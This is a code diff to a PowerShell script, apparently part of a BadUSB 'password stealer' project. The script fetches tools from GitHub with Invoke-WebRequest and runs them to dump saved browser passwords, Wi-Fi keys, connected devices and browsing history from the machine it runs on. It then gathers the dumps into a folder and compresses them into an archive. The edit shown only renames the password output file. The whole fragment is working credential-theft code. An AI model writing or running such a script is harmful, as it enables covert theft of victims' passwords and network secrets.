@@ -25,15 +25,15 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 # Execute tools to gather data
 .\WNetWatcher.exe /stext connected_devices.txt
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
-.\WebBrowserPassView.exe /scomma passwords.csv
+.\WebBrowserPassView.exe /stext passwords.txt
 .\WirelessKeyView.exe /stext wifi.txt
 
 # Wait for the files to be fully written
-while (!(Test-Path "passwords.csv") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
+while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
     Start-Sleep -Seconds 1
 }
 
-Move-Item passwords.csv, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
+Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
 
 # Compress extracted data
 Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
